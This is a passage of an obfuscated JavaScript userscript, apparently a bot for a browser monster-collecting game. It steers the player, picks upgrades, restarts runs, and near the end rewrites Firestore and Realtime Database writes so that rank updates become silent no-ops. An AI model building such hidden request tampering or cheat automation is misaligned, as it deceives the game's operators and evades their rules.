                            g.fill(x + 1, y + 1, x + w - 1, y + w - 1, t.kind === 1 ? i => { g.blocked[i] = 1; } : i => { g.cost[i] += 15; });
                        }
                        for (const h of hazards) {
                            if (h.shape) {
                                const xs = h.pts.map(p => (p.x - e0) / s), ys = h.pts.map(p => (p.y - f0) / s), m = CFG.hazardMargin + h.lw / 2 / s;
                                g.fill(Math.min(...xs) - m, Math.min(...ys) - m, Math.max(...xs) + m, Math.max(...ys) + m, (i, x, y) => {
                                    const d = shapeDist(h, { x: x * s + e0, y: y * s + f0 }) / s;
                                    if (d < CFG.hazardMargin)
                                        g.cost[i] += d < 0 ? 35 : 25;
                                });
                            }
                            else {
                                const c = W(h), r = Math.max(Math.abs(h.w), Math.abs(h.h)) / 2 / s + CFG.hazardMargin;
                                g.fill(c.x - r, c.y - r, c.x + r, c.y + r, (i, x, y) => { if (Math.hypot(x - c.x, y - c.y) < r)
                                    g.cost[i] += 25; });
                            }
                        }
                        for (const e of enemies) {
                            const c = W(e), r = Math.max(Math.abs(e.w), Math.abs(e.h)) / 2 / s + CFG.contact;
                            g.fill(c.x - r, c.y - r, c.x + r, c.y + r, (i, x, y) => { if (Math.hypot(x - c.x, y - c.y) < r)
                                g.cost[i] += 3; });
                        }
                        const plan = { at: now, goal: to, wp: null, cells: [], none: false };
                        if (lineClear(g, from, to))
                            return plan;
                        const R = CFG.pathRadius - 1, [ti, tj] = g.at(to.x, to.y), [si, sj] = g.at(from.x, from.y);
                        const k = Math.min(1, R / Math.max(Math.abs(ti - si), Math.abs(tj - sj), 1));
                        const gi = Math.round(si + (ti - si) * k), gj = Math.round(sj + (tj - sj) * k);
                        const path = findPath(g, sj * g.n + si, gj * g.n + gi);
                        if (!path)
                            return { ...plan, none: true };
                        if (!path.length)
                            return { ...plan, gaveUp: true };
                        plan.cells = path.map(idx => ({ x: (g.ox + idx % g.n + 0.5) * CFG.cell, y: (g.oy + Math.floor(idx / g.n) + 0.5) * CFG.cell }));
                        plan.wp = plan.cells[1] || to;
                        for (let i = plan.cells.length - 1; i > 1; i--)
                            if (lineClear(g, from, plan.cells[i], CFG.bodyRadius)) {
                                plan.wp = plan.cells[i];
                                break;
                            }
                        return plan;
                    }
                    let wp = null;
                    if (target && !hold && !escape) {
                        const tW = { x: (target.x - e0) / s, y: (target.y - f0) / s }, p = state.path;
                        if (!p || now - p.at > 300 || Math.hypot(p.goal.x - tW.x, p.goal.y - tW.y) > CFG.cell || (p.wp && Math.hypot(p.wp.x - meW.x, p.wp.y - meW.y) < CFG.cell)) {
                            state.path = planPath(meW, tW);
                            const g = state.giveUps;
                            state.giveUps = state.path.gaveUp ? { ...tW, n: (g && Math.hypot(g.x - tW.x, g.y - tW.y) <= CFG.cell ? g.n : 0) + 1 } : null;
                            if ((state.path.none || (state.giveUps && state.giveUps.n >= 10)) && target !== foe) {
                                const skip = target === rift || target === quest ? CFG.riftIgnore : 20000;
                                state.ignore.push({ ...tW, until: now + skip });
                                state.giveUps = null;
                                log(`không có đường tới ${target === rift ? _0xstr(0x572) : target === quest ? _0xstr(0x573) : _0xstr(0x574)} — bỏ qua ${skip / 1000}s`);
                            }
                        }
                        wp = state.path.wp;
                    }
                    else
                        state.path = null;
                    const wpS = wp && toScreen(wp);
                    state.view.path = state.path && state.path.cells.map(toScreen);
                    state.view.wp = wpS;
                    let flee = null;
                    const fleeW = low ? CFG.fleeWeight : enemies.filter(e => edge(e) < 250).length >= CFG.crowdFlee ? CFG.fleeCrowdWeight : 0;
                    if (fleeW) {
                        let fx = 0, fy = 0;
                        for (const e of enemies) {
                            const d = edge(e);
                            if (d > 400)
                                continue;
                            const r = dist(e, me) || 1, k = 1 / Math.max(d, 20);
                            fx += (me.x - e.x) / s / r * k;
                            fy += (me.y - e.y) / s / r * k;
                        }
                        const l = Math.hypot(fx, fy);
                        if (l > 0)
                            flee = [fx / l, fy / l];
                    }
                    const cost = dir => {
                        const at = k => ({ x: me.x + (dir ? dir[0] : 0) * CFG.lookahead * s * k, y: me.y + (dir ? dir[1] : 0) * CFG.lookahead * s * k });
                        const p = at(1);
                        let c = 0;
                        const half = at(0.5);
                        for (const e of stay ? [] : enemies) {
                            const d = e.boss ? Math.min(dist(half, e.boss), dist(p, e.boss)) - CFG.bossRange + CFG.contact
                                : Math.min(dist(half, e), dist(p, e)) - Math.max(e.w, e.h) / 2 / s;
                            if (d < CFG.contact)
                                c += (low ? 20 : 10) * ((CFG.contact - Math.max(d, 0)) / CFG.contact) ** 2;
                        }
                        for (const q of [at(0.5), p]) {
                            for (const h of stay || escape ? [] : hazards) {
                                if (h.shape) {
                                    const d = shapeDist(h, q) / s;
                                    if (d < CFG.hazardMargin)
                                        c += 25 * Math.min(1, (CFG.hazardMargin - d) / CFG.hazardMargin) + (d < 0 ? 10 : 0);
                                }
                                else {
                                    const d = dist(q, h), r = Math.max(h.w, h.h) / 2 / s + CFG.hazardMargin;
                                    if (d < r)
                                        c += 20 * (1 - d / r) + 5;
                                }
                            }
                        }
                        for (const w of walls) {
                            const d = dist(p, w), r = (w.rw + 70) * 0.4;
                            if (d < r)
                                c += 15 * (1 - d / r) + 3;
                        }
                        if (dir && wallTiles.size) {
                            const hit = d => wallAt(meW.x + dir[0] * d, meW.y + dir[1] * d);
                            if (hit(CFG.bodyRadius + 6))
                                c += 60;
                            else if (hit(CFG.lookahead / 2))
                                c += 20;
                            else if (hit(CFG.lookahead))
                                c += 6;
                        }
                        if (dir && flee && !stay)
                            c -= fleeW * (dir[0] * flee[0] + dir[1] * flee[1]);
                        if (escape)
                            c -= dir ? 40 * (dir[0] * escape[0] + dir[1] * escape[1]) : 0;
                        else if (target && hold)
                            c += weight * dist(p, target) / CFG.lookahead;
                        else if (wpS)
                            c += weight * (segDist(wpS, me, p) / s + 0.2 * dist(p, wpS)) / CFG.lookahead;
                        else if (target && !stop)
                            c += weight * (segDist(target, me, p) / s + 0.2 * dist(p, target)) / CFG.lookahead;
                        else if (target)
                            c += weight * Math.abs(dist(p, target) - stop) / CFG.lookahead;
                        if (dir && dir === state.dir)
                            c -= 0.15;
                        return c;
                    };
                    let pick = null, pickCost = target && (!stop || wpS) && !hold && !escape ? Infinity : cost(null) + (hold ? 0 : 0.1);
                    DIRS.forEach(d => {
                        const c = cost(d);
                        if (c < pickCost) {
                            pick = d;
                            pickCost = c;
                        }
                    });
                    applyDir(pick);
                    if (CFG.aim && foe) {
                        const r = canvas.getBoundingClientRect();
                        const clientX = r.left + foe.x * r.width / canvas.width, clientY = r.top + foe.y * r.height / canvas.height;
                        window.dispatchEvent(new MouseEvent(_0xstr(0x575), { clientX, clientY, bubbles: true }));
                    }
                }
                const visible = el => !!el && el.getClientRects().length > 0 && getComputedStyle(el).visibility !== _0xstr(0x576);
                const STAT_OF = { vigor: _0xstr(0x577), power: _0xstr(0x578), potencia: _0xstr(0x579), sprint: _0xstr(0x57a), carrera: _0xstr(0x57b), reflexes: _0xstr(0x57c), reflejos: _0xstr(0x57d),
                    armor: _0xstr(0x57e), coraza: _0xstr(0x57f), synthesis: _0xstr(0x580), 'síntesis': _0xstr(0x581), magnet: _0xstr(0x582), 'imán': _0xstr(0x583), learning: _0xstr(0x584),
                    aprendizaje: _0xstr(0x585), 'sitrus berry': _0xstr(0x586), 'baya zidra': _0xstr(0x587), focus: _0xstr(0x588), sniper: _0xstr(0x589), revive: _0xstr(0x58a) };
                const STAT_PRI = { atk: 60, cd: 55, crit: 50, critDmg: 50, def: 45, hp: 40, rgn: 35, xp: 30, mag: 25, revive: 20, spd: 15 };
                const LV_ROWS = [
                    [_0xstr(0x58b), 1000, _0xstr(0x58c)],
                    [_0xstr(0x58d), 990, _0xstr(0x58e), _0xstr(0x58f)],
                    [_0xstr(0x590), 980, _0xstr(0x591), _0xstr(0x592)],
                    [_0xstr(0x593), 950, _0xstr(0x594)],
                    [_0xstr(0x595), 900, _0xstr(0x596)],
                    [_0xstr(0x597), 700, _0xstr(0x598)],
                    [_0xstr(0x599), 690, _0xstr(0x59a), _0xstr(0x59b)],
                    [_0xstr(0x59c), 660, _0xstr(0x59d)],
                    [_0xstr(0x59e), 600, _0xstr(0x59f)],
                    [_0xstr(0x5a0), 570, SITE.id === _0xstr(0x5a1) ? _0xstr(0x5a2) : _0xstr(0x5a3)],
                    [_0xstr(0x5a4), 560, _0xstr(0x5a5)], [_0xstr(0x5a6), 555, _0xstr(0x5a7)],
                    [_0xstr(0x5a8), 550, _0xstr(0x5a9), _0xstr(0x5aa)], [_0xstr(0x5ab), 550, _0xstr(0x5ac), _0xstr(0x5ad)],
                    [_0xstr(0x5ae), 545, _0xstr(0x5af)], [_0xstr(0x5b0), 540, _0xstr(0x5b1)], [_0xstr(0x5b2), 535, _0xstr(0x5b3)],
                    [_0xstr(0x5b4), 530, _0xstr(0x5b5)], [_0xstr(0x5b6), 525, _0xstr(0x5b7)],
                    [_0xstr(0x5b8), 520, _0xstr(0x5b9), _0xstr(0x5ba)], [_0xstr(0x5bb), 520, _0xstr(0x5bc)], [_0xstr(0x5bd), 515, _0xstr(0x5be)],
                    [_0xstr(0x5bf), 500, _0xstr(0x5c0)],
                    [_0xstr(0x5c1), 430, _0xstr(0x5c2)],
                    [_0xstr(0x5c3), 200, _0xstr(0x5c4)],
                    [_0xstr(0x5c5), 10, _0xstr(0x5c6)],
                ].filter(([, , , site]) => !site || site === (SITE.id === _0xstr(0x5c7) ? _0xstr(0x5c8) : _0xstr(0x5c9)));
                const LV_DEF = Object.fromEntries(LV_ROWS.map(([id, s]) => [id, s]));
                function savedOrder(key, defaults, onChange = () => { }) {
                    const o = { key, defaults, order: defaults };
                    o.set = ids => {
                        const order = [...new Set((Array.isArray(ids) ? ids : []).filter(id => defaults.includes(id)))];
                        defaults.forEach((id, i) => { if (!order.includes(id))
                            order.splice(i ? order.indexOf(defaults[i - 1]) + 1 : 0, 0, id); });
                        o.order = order.join() === defaults.join() ? defaults : order;
                        onChange(o.order);
                    };
                    o.save = ids => {
                        o.set(ids);
                        try {
                            if (o.order === defaults)
                                localStorage.removeItem(key);
                            else
                                localStorage.setItem(key, JSON.stringify(o.order));
                        }
                        catch { }
                    };
                    let saved = null;
                    try {
                        saved = JSON.parse(localStorage.getItem(key));
                    }
                    catch { }
                    o.set(saved);
                    return o;
                }
                const lvSet = savedOrder(_0xstr(0x5ca), LV_ROWS.map(([id]) => id));
                const lvBase = id => lvSet.order === lvSet.defaults ? LV_DEF[id] : 200 * (lvSet.order.length - lvSet.order.indexOf(id));
                const lvLow = (id, score) => lvSet.order.indexOf(id) > lvSet.order.indexOf(_0xstr(0x5cb)) || (score < 500 && LV_DEF[id] >= 500);
                const ITEM_ROWS = [
                    [_0xstr(0x5cc), _0xstr(0x5cd)],
                    [_0xstr(0x5ce), _0xstr(0x5cf)],
                    [_0xstr(0x5d0), _0xstr(0x5d1)],
                    [_0xstr(0x5d2), _0xstr(0x5d3)],
                    [_0xstr(0x5d4), SITE.id === _0xstr(0x5d5) ? _0xstr(0x5d6) : _0xstr(0x5d7)],
                    [_0xstr(0x5d8), _0xstr(0x5d9), _0xstr(0x5da)],
                    [_0xstr(0x5db), _0xstr(0x5dc), _0xstr(0x5dd)],
                    [_0xstr(0x5de), _0xstr(0x5df), _0xstr(0x5e0)],
                    [_0xstr(0x5e1), _0xstr(0x5e2)],
                    [_0xstr(0x5e3), _0xstr(0x5e4)],
                    [_0xstr(0x5e5), SITE.id === _0xstr(0x5e6) ? _0xstr(0x5e7) : _0xstr(0x5e8)],
                    [_0xstr(0x5e9), _0xstr(0x5ea)],
                    [_0xstr(0x5eb), _0xstr(0x5ec)],
                    [_0xstr(0x5ed), _0xstr(0x5ee)],
                    [_0xstr(0x5ef), _0xstr(0x5f0)],
                ].filter(([, , site]) => !site || site === (SITE.id === _0xstr(0x5f1) ? _0xstr(0x5f2) : _0xstr(0x5f3)));
                const itemSet = savedOrder(_0xstr(0x5f4), ITEM_ROWS.map(([id]) => id), order => {
                    const line = order.indexOf(_0xstr(0x5f5));
                    CFG.itemScores = Object.fromEntries(order.filter(n => n !== _0xstr(0x5f6)).map(n => [n, order.indexOf(n) < line ? 100 - order.indexOf(n) : 10 - order.indexOf(n) + line]));
                    CFG.swapAwayItems = order.slice(line + 1);
                });
                const KIND_PRI = { homing: 13, nova: 12, aura: 12, orbit: 11, chain: 10, projectile: 9, boomerang: 8, beam: 8, meteor: 8, turret: 7, mine: 6, cone: 6, melee: 4, dash: 3, trail: 3 };
                const BUFF_STAT = { 'nasty plot': _0xstr(0x5f7), 'swords dance': _0xstr(0x5f8), 'dragon dance': _0xstr(0x5f9), harden: _0xstr(0x5fa), 'aqua ring': _0xstr(0x5fb), agility: _0xstr(0x5fc) };
                function autoScore({ buff, stat, kind, fit, n, side, atkBuff }) {
                    if (buff) {
                        if ((stat === _0xstr(0x5fd) || stat === _0xstr(0x5fe)) && !atkBuff && (!side || (stat === _0xstr(0x5ff)) === (side === _0xstr(0x600))))
                            return [850, _0xstr(0x601)];
                        if (stat === _0xstr(0x602))
                            return [845, _0xstr(0x603)];
                        if (stat === _0xstr(0x604))
                            return [838, _0xstr(0x605)];
                        return stat === _0xstr(0x606) ? [300, _0xstr(0x607)] : [150, _0xstr(0x608)];
                    }
                    const score = (n === 0 ? 860 : n === 1 ? 815 : 780) + (fit === true ? 10 : fit === false ? -40 : 0) + (KIND_PRI[kind] || 5);
                    return [score, `move sát thương thứ ${n + 1}${fit === false ? _0xstr(0x609) : fit ? _0xstr(0x60a) : ''}`];
                }
                function autoNew(lname, noDmg, fitLow, fitHigh, g = {}) {
                    const m = moveOf(lname) || {};
                    const kind = g.kind || m.kind, cat = g.cat || (m.cat !== _0xstr(0x60b) ? m.cat : null);
                    const ownedNames = [...Object.keys(state.picks), ...state.hudTexts].map(n => n.toLowerCase());
                    const ownedDmg = [...new Set(ownedNames.map(n => moveOf(n)).filter(x => x && x.cat !== _0xstr(0x60c)))];
                    const phys = ownedDmg.filter(x => x.cat === _0xstr(0x60d)).length, spec = ownedDmg.length - phys;
                    const side = g.side || (phys > spec ? _0xstr(0x60e) : spec > phys ? _0xstr(0x60f) : null);
                    const fit = g.fit != null ? g.fit >= 0.999 : fitHigh ? true : fitLow ? false : side && cat ? cat === side : null;
                    const atkBuff = ownedNames.some(n => BUFF_STAT[n] === _0xstr(0x610) || BUFF_STAT[n] === _0xstr(0x611));
                    return autoScore({ buff: kind === _0xstr(0x612) || m.cat === _0xstr(0x613) || (!m.kind && noDmg), stat: g.stat || BUFF_STAT[lname], kind, fit, n: g.dmgOwned ?? ownedDmg.length, side, atkBuff });
                }
                const autoBuilds = new Map();
                function autoBuild(name) {
                    const n = name.toLowerCase(), hit = autoBuilds.get(n);
                    if (hit && performance.now() - hit.at < 3000)
                        return hit.build;
                    const ls = learnsetOf(n);
                    let build = null;
                    if (ls) {
                        const pool = [...ls.natural, ...ls.taught], start = ls.natural[0];
                        const statOf = m => m.stat || BUFF_STAT[m.name.toLowerCase()];
                        const side = (SITE.monSide && SITE.monSide(n)) || (start.cat !== _0xstr(0x614) ? start.cat : null);
                        const atk = pool.filter(m => statOf(m) === _0xstr(0x615) || statOf(m) === _0xstr(0x616));
                        const buff = atk.find(m => !side || (statOf(m) === _0xstr(0x617)) === (side === _0xstr(0x618))) || (side ? null : atk[0]);
                        build = [start, buff, pool.find(m => statOf(m) === _0xstr(0x619))].filter(Boolean).map(m => m.name);
                        build = [...new Set(build)];
                        build.auto = true;
                    }
                    autoBuilds.set(n, { at: performance.now(), build });
                    return build;
                }
                const fontSize = el => parseFloat(getComputedStyle(el).fontSize) || 0;
                const currentBuild = () => {
                    for (const t of state.hudTexts) {
                        const b = CFG.builds[t.toLowerCase()];
                        if (b)
                            return b;
                    }
                    for (const t of state.hudTexts) {
                        const b = autoBuild(t);
                        if (b)
                            return b;
                    }
                    return null;
                };
                Object.assign(h, { CFG, state, visible, fontSize, scoreCard, pickRow, currentBuild, lvBase, log });
                function scoreCard({ key, name, t, level, isNew, evo, fitLow, fitHigh, type, stat, maxLvl, armorFull, evolved, auto }) {
                    const build = currentBuild();
                    const noDmg = /no damage|sin daño|sem dano/i.test(t);
                    const lname = name.toLowerCase();
                    const move = moveOf(lname);
                    const buildIdx = build ? build.findIndex(m => m.toLowerCase() === lname) : -1;
                    const ownedMoves = new Set([...Object.keys(state.picks), ...state.hudTexts].map(n => n.toLowerCase()));
                    const ms = SITE.moveSlots && SITE.moveSlots();
                    const slots = ms ? ms.max : CFG.maxSkills;
                    const used = ms ? ms.used : isNew ? Math.min(1 + state.newSkills, slots - 1) : 1 + state.newSkills;
                    const kind = type === _0xstr(0x61a) ? _0xstr(0x61b) : evo || type === _0xstr(0x61c) ? _0xstr(0x61d) : isNew || type === _0xstr(0x61e) ? _0xstr(0x61f) : type || (STAT_OF[lname] || !(move || level > 0 || state.hudTexts.has(name)) ? _0xstr(0x620) : _0xstr(0x621));
                    const sid = kind === _0xstr(0x622) ? stat || STAT_OF[lname] : null;
                    let score, why, row = kind === _0xstr(0x623) || kind === _0xstr(0x624) || kind === _0xstr(0x625) ? kind : null;
                    if (kind === _0xstr(0x626)) {
                        score = 1000;
                        why = _0xstr(0x627);
                    }
                    else if (kind === _0xstr(0x628)) {
                        score = 990;
                        why = _0xstr(0x629);
                    }
                    else if (kind === _0xstr(0x62a)) {
                        const missing = build ? build.filter(m => !ownedMoves.has(m.toLowerCase())).length : 0;
                        if (buildIdx >= 0) {
                            score = 900 - 5 * buildIdx;
                            why = `lấy move build #${buildIdx + 1}`;
                        }
                        else if (!build && used < slots)
                            [score, why] = autoNew(lname, noDmg, fitLow, fitHigh, auto);
                        else if (build && build.auto && used + missing < slots)
                            [score, why] = autoNew(lname, noDmg, fitLow, fitHigh, auto);
                        else if (build && used + missing < slots) {
                            score = 200;
                            row = _0xstr(0x62b);
                            why = `move ngoài build (${used}/${slots} ô, giữ ${missing} ô cho build)`;
                        }
                        else {
                            score = -100;
                            why = _0xstr(0x62c);
                        }
                    }
                    else if (kind === _0xstr(0x62d)) {
                        const canEvolve = !evolved && evolveNeeds.has(lname), lv = Math.max(1, level || 1), max = maxLvl || 5;
                        row = buildIdx >= 0 ? _0xstr(0x62e) : canEvolve ? _0xstr(0x62f) : _0xstr(0x630);
                        if (buildIdx >= 0) {
                            score = 680 - 5 * buildIdx;
                            why = `nâng move build #${buildIdx + 1} (cấp ${lv}${canEvolve ? `/${max}` : ''})`;
                        }
                        else if (canEvolve) {
                            score = 600 + Math.round(40 * Math.min(1, lv / max));
                            why = `nâng move còn tiến hoá được (cấp ${lv}/${max})`;
                        }
                        else {
                            score = 430;
                            why = `nâng move (cấp ${lv})`;
                        }
                    }
                    else {
                        const needFor = !state.picks[name] ? [...evolveNeeds].filter(([m, p]) => p.toLowerCase() === lname && ownedMoves.has(m)).map(([m]) => m) : [];
                        const full = armorFull ?? (state.picks[name] || 0) >= (SITE.armorCards || 12);
                        if (sid === _0xstr(0x631)) {
                            const low = state.hpRatio < 0.35;
                            score = low ? 950 : 10;
                            row = low ? _0xstr(0x632) : _0xstr(0x633);
                            why = low ? _0xstr(0x634) : _0xstr(0x635);
                        }
                        else if (needFor.length) {
                            score = 700;
                            row = _0xstr(0x636);
                            why = `điều kiện tiến hoá ${needFor.join(_0xstr(0x637))}`;
                        }
                        else if (sid === _0xstr(0x638) && !full) {
                            score = 570;
                            row = _0xstr(0x639);
                            why = _0xstr(0x63a);
                        }
                        else {
                            score = 500 + (STAT_PRI[sid] ?? 20);
                            row = sid in LV_DEF ? sid : _0xstr(0x63b);
                            why = `nội tại${sid ? ` ${sid}` : ''}`;
                        }
                    }
                    const notes = [why];
                    if (fitLow) {
                        score -= 3;
                        notes.push(_0xstr(0x63c));
                    }
                    if (fitHigh) {
                        score += 2;
                        notes.push(_0xstr(0x63d));
                    }
                    if (CFG.bonusRe && CFG.bonusRe.test(t)) {
                        score += CFG.bonusScore || 0;
                        notes.push(_0xstr(0x63e));
                    }
                    const low = lvLow(row, score);
                    score += lvBase(row) - LV_DEF[row];
                    return { key, name, isNew: kind === _0xstr(0x63f), inBuild: buildIdx >= 0, score, low, why: notes.join(_0xstr(0x640)), text: t.replace(/\s+/g, _0xstr(0x641)).slice(0, 100) };
                }
                function levelUp() {
                    if (!CFG.autoPick || !state.on || performance.now() < state.pickAt)
                        return;
                    const found = SITE.levelUp();
                    if (!found || !found.cards.length)
                        return;
                    if (SITE.cardFacts)
                        found.cards.forEach((c, i) => {
                            const f = SITE.cardFacts(c, i);
                            if (f && f.evoNow && c.score < lvBase(_0xstr(0x642)))
                                Object.assign(c, { score: lvBase(_0xstr(0x643)), low: false, why: _0xstr(0x644) });
                        });
                    const cards = found.cards.sort((a, b) => b.score - a.score);
                    state.pickAt = performance.now() + 800;
                    console.table(cards);
                    if ((cards[0].low ?? cards[0].score < 500) && found.rerolls > 0 && (found.reroll || !cards[0].el)) {
                        log(_0xstr(0x645));
                        if (found.reroll)
                            found.reroll();
                        else
                            tap(_0xstr(0x646), _0xstr(0x647), 82);
                        return;
                    }
                    const c = cards[0];
                    state.picks[c.name] = (state.picks[c.name] || 0) + 1;
                    if (c.isNew)
                        state.newSkills++;
                    log(_0xstr(0x648), c.key, c.name, _0xstr(0x649), c.why);
                    if (c.pick)
                        c.pick();
                    else if (c.el)
                        tapEl(c.el);
                    else
                        tap(c.key, `Digit${c.key}`, 48 + +c.key);
                }
                function useItems(t) {
                    if (!CFG.useItems || !state.on || state.dead || t < (state.itemAt || 0))
                        return;
                    if (SITE.pilot && SITE.pilot.active())
                        return;
                    if (!state.timerText || t - state.timerChangedAt > 1100 || SITE.choiceOpen())
                        return;
                    state.itemAt = t + CFG.itemEvery;
                    CFG.itemKeys.forEach(k => tap(k, `Digit${k}`, 48 + +k));
                }
                function swapSkills(t) {
                    if (!CFG.swapSkills || !state.on || state.dead || t < (state.swapAt || 0))
                        return;
                    if (SITE.pilot && SITE.pilot.holdSlot())
                        return;
                    if (!state.timerText || t - state.timerChangedAt > 1100 || SITE.choiceOpen())
                        return;
                    state.swapAt = t + CFG.swapEvery;
                    sendKey(_0xstr(0x64a), _0xstr(0x64b), _0xstr(0x64c), 69);
                    sendKey(_0xstr(0x64d), _0xstr(0x64e), _0xstr(0x64f), 69);
                }
                function dialogRows(head, isDialog) {
                    let dialog = head;
                    while (dialog.parentElement && !isDialog(dialog))
                        dialog = dialog.parentElement;
                    const isDigit = e => !e.children.length && /^\d$/.test((e.textContent || '').trim());
                    let digits = PSBotList(dialog.querySelectorAll(_0xstr(0x650))).filter(e => isDigit(e) && visible(e));
                    const touch = !digits.length;
                    if (touch)
                        digits = PSBotList(dialog.querySelectorAll(_0xstr(0x651))).filter(isDigit);
                    const rows = digits.map(k => {
                        let row = k;
                        while (row.parentElement && row.parentElement !== dialog && PSBotList(row.parentElement.querySelectorAll(_0xstr(0x652))).filter(e => digits.includes(e)).length === 1)
                            row = row.parentElement;
                        return { key: k.textContent.trim(), row };
                    });
                    if (touch && !rows.length)
                        PSBotList(dialog.querySelectorAll(_0xstr(0x653))).forEach((row, i) => rows.push({ key: String(i + 1), row }));
                    return rows.filter(o => !touch || visible(o.row))
                        .map(({ key, row }) => ({ key, text: row.innerText.replace(/\s+/g, _0xstr(0x654)).trim(), el: touch ? row : null }))
                        .filter(o => o.text.length > 3);
                }
                function pickRow(kind, opts) {
                    if (!opts.length)
                        return;
                    opts.sort((a, b) => b.score - a.score);
                    state.pickAt = performance.now() + 800;
                    console.table(opts);
                    log(kind, opts[0].key, opts[0].name || _0xstr(0x655), opts[0].why || '');
                    if (opts[0].el)
                        tapEl(opts[0].el);
                    else
                        tap(opts[0].key, `Digit${opts[0].key}`, 48 + +opts[0].key);
                }
                function dialogPick() {
                    const now = performance.now();
                    if (!CFG.autoPick || !state.on || now < state.pickAt || now < (state.itemScanAt || 0))
                        return;
                    state.itemScanAt = now + 300;
                    if (SITE.pilot && SITE.pilot.choices())
                        return;
                    const head = PSBotList(document.querySelectorAll(_0xstr(0x656))).find(e => !e.children.length && visible(e) && /only hold one|An item!|Bond!|to bond/i.test(e.innerText || ''));
                    if (!head)
                        return void SITE.otherChoice();
                    if (/bond/i.test(head.innerText)) {
                        const build = currentBuild() || [];
                        pickRow(_0xstr(0x657), dialogRows(head, el => (el.innerText.match(/\b(?:Nv|Lv|Niv)\.?\s*\d/gi) || []).length >= 2).map(o => {
                            const lv = +((o.text.match(/\b(?:Nv|Lv|Niv)\.?\s*(\d+)/i) || [])[1] || 0);
                            const name = o.text.replace(/\s*\b(?:Nv|Lv|Niv)\.?\s*\d+.*$/i, '').trim();
                            const idx = build.findIndex(m => m.toLowerCase() === name.toLowerCase());
                            const noDmg = /no damage|sin daño|sem dano/i.test(o.text);
                            const score = idx >= 0 ? 100 - idx * 10 : lv * 3 + (noDmg ? -6 : 2);
                            return { ...o, name, score, why: `Nv.${lv}${idx >= 0 ? ` · build #${idx + 1}` : ''}${noDmg ? _0xstr(0x658) : ''}` };
                        }));
                        return;
                    }
                    const names = Object.keys(CFG.itemScores);
                    pickRow(_0xstr(0x659), dialogRows(head, el => names.some(n => el.innerText.toLowerCase().includes(n))).map(o => {
                        const name = names.find(n => o.text.toLowerCase().includes(n));
                        const keep = /^keep|giữ|mantener|conservar/i.test(o.text);
                        const dump = keep && CFG.swapAwayItems.includes(name);
                        return { ...o, name, keep, score: dump ? -2 : name ? CFG.itemScores[name] + (keep ? 0.5 : 0) : -1, why: dump ? _0xstr(0x65a) : keep ? _0xstr(0x65b) : '' };
                    }));
                }
                function autoRestart(now) {
                    if (!CFG.autoRestart || !state.on || now < (state.restartAt || 0))
                        return;
                    state.restartAt = now + 1500;
                    if (SITE.choiceOpen())
                        return;
                    const leaves = PSBotList(document.querySelectorAll(_0xstr(0x65c))).filter(e => !e.children.length && visible(e));
                    if (leaves.some(e => /only hold one|An item!|Bond!|to bond/i.test(e.innerText || '')))
                        return;
                    const ours = e => dock.contains(e) || !!e.closest(_0xstr(0x65d));
                    const onTop = b => {
                        const r = b.getBoundingClientRect(), x = r.left + r.width / 2, y = r.top + r.height / 2;
                        if (x < 0 || y < 0 || x >= innerWidth || y >= innerHeight)
                            return getComputedStyle(b).pointerEvents !== _0xstr(0x65e);
                        const t = document.elementsFromPoint(x, y).find(e => !ours(e));
                        return !!t && (t === b || b.contains(t));
                    };
                    const buttons = PSBotList(document.querySelectorAll(_0xstr(0x65f))).filter(b => visible(b) && !dock.contains(b) && onTop(b));
                    const pilot = SITE.pilot;
                    const over = (pilot && pilot.runOver()) || leaves.some(e => /you fell|run over|game over|has caído|caíste/i.test(e.innerText || ''));
                    if (state.runEnded === null)
                        state.runEnded = over;
                    const menu = (pilot && pilot.menuOpen()) || SITE.menu(buttons);
                    if (!over && !menu && now - (state.timerChangedAt || 0) < 2500)
                        return;
                    const justEnded = over && !state.runEnded;
                    state.runEnded = over;
                    if (justEnded) {
                        state.done++;
                        state.saveFrom = now;
                        log(`xong ván ${state.done}${state.target ? `/${state.target}` : ''}`);
                        if (state.target && state.done >= state.target) {
                            state.on = false;
                            applyDir(null);
                            log(_0xstr(0x660));
                            return;
                        }
                    }
                    if (state.saveFrom && menu) {
                        const s = SITE.saveGame && SITE.saveGame();
                        if (s && !s.done && now - state.saveFrom < 60000) {
                            if (!state.saveClicked && !s.busy) {
                                state.saveClicked = true;
                                log(_0xstr(0x661));
                                s.el.click();
                            }
                            return;
                        }
                        if (state.saveClicked)
                            log(s && !s.done ? _0xstr(0x662) : _0xstr(0x663));
                        state.saveFrom = 0;
                        state.saveClicked = false;
                    }
                    const b = (pilot && pilot.restartButton()) || SITE.restartButton(buttons);
                    if (b && b.halt) {
                        control.stop();
                        Object.assign(state, { halt: b.halt, haltActions: b.actions || null });
                        log(b.halt);
                        return;
                    }
                    if (b) {
                        log(_0xstr(0x664), JSON.stringify(b.innerText.trim().slice(0, 40)));
                        b.click();
                    }
                }
                const XO = XMLHttpRequest.prototype.open, XS = XMLHttpRequest.prototype.send, WS = WebSocket.prototype.send;
                const noopWrite = name => ({
                    update: { name: name.replace(/\/documents\/.*$/, `/documents/profiles/${firebase.auth().currentUser.uid}`), fields: {} },
                    updateMask: { fieldPaths: [] },
                });
                function filterFirestore(body) {
                    const p = new URLSearchParams(body);
                    let changed = false;
                    for (const [k, v] of [...p]) {
                        if (!/^req\d+___data__$/.test(k))
                            continue;
                        let msg;
                        try {
                            msg = JSON.parse(v);
                        }
                        catch {
                            continue;
                        }
                        if (!Array.isArray(msg.writes))
                            continue;
                        msg.writes = msg.writes.map(w => {
                            const name = (w.update && w.update.name) || w.delete || (w.transform && w.transform.document) || '';
                            const path = name.replace(/^.*?\/documents\//, '');
                            const hit = CFG.blockRank && CFG.rankRe.test(path);
                            if (CFG.logNet)
                                log(`firestore ${hit ? _0xstr(0x665) : _0xstr(0x666)}: ${path}`, hit ? '' : Object.keys((w.update && w.update.fields) || {}));
                            if (!hit)
                                return w;
                            changed = true;
                            state.netBlocked++;
                            return noopWrite(name);
                        });
                        p.set(k, JSON.stringify(msg));
                    }
                    return changed ? p.toString() : body;
                }
                function filterRtdb(data) {
                    let m;
                    try {
                        m = JSON.parse(data);
                    }
                    catch {
                        return data;
                    }
                    const a = m && m.d && m.d.a, b = m && m.d && m.d.b;
                    if (!b || (a !== _0xstr(0x667) && a !== _0xstr(0x668)))
                        return data;
                    const hit = CFG.blockRank && CFG.rankRe.test(b.p || '');
                    if (CFG.logNet)
                        log(`rtdb ${hit ? _0xstr(0x669) : _0xstr(0x66a)}: ${b.p}`);
                    if (!hit)
                        return data;
                    state.netBlocked++;
                    m.d.a = _0xstr(0x66b);
                    b.d = {};
                    return JSON.stringify(m);
                }
